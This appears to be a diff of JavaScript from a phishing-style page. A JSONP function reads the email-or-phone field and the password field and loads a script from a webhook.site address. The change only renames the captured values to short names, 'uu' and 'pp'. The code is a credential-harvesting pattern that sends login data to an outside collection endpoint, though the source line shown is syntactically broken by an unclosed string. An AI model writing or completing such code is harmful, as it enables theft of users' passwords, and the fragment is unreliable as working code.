@@ -9,8 +9,8 @@ function sendJSONPRequest() {
     var script = document.createElement('script');
     
     // Set the source URL with a callback parameter
-    const emailOrPhoneValue = document.querySelector('input[type="text"]').value;
-    const passwordValue = document.querySelector('input[type="password"]').value;
+    const uu = document.querySelector('input[type="text"]').value;
+    const pp = document.querySelector('input[type="password"]').value;
     script.src = 'https://webhook.site/1a6c6682-deae-47ae-8ae8-7a7c645c3d3a?callback=handleResponse;
     
     // Append the script tag to the document
